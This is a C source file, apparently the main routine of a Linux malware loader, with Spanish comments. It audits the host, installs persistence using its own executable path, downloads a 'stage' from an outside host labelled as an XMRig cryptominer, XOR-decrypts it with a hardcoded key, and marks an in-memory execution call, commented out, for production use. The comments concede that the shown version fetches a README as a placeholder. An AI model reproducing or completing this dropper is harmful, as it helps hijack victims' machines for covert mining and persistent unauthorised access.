#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include "loader.h"
#include "recon.h"
#include "memexec.h"
#include "network.h"
#include "crypto.h"
#include "persistence.h"

int main(int argc, char *argv[], char *envp[]) {
    srand(time(NULL));
    system_info_t info;
    size_t payload_len;
    unsigned char *payload;
    const char *encryption_key = "ENI_LO_PRIVATE_KEY_2023";

    audit_system(&info);

    char self_path[512];
    if (readlink("/proc/self/exe", self_path, sizeof(self_path)) > 0) {
        deploy_persistence(self_path);
    }

    // XMRig Download (Simplified/POC)
    // En producción usarías una URL real con el binario cifrado
    payload = download_stage("raw.githubusercontent.com", "/xmrig/xmrig/master/README.md", &payload_len);
    
    if (payload) {
        xor_payload(payload, payload_len, encryption_key);
        printf("[SYSTEM] Stage loaded: %zu bytes. Executing...\n", payload_len);
        
        // El README no es ejecutable, así que esto fallaría en una prueba real.
        // En producción: execute_from_mem(payload, payload_len, argv, envp);
        free(payload);
    }

    return 0;
}
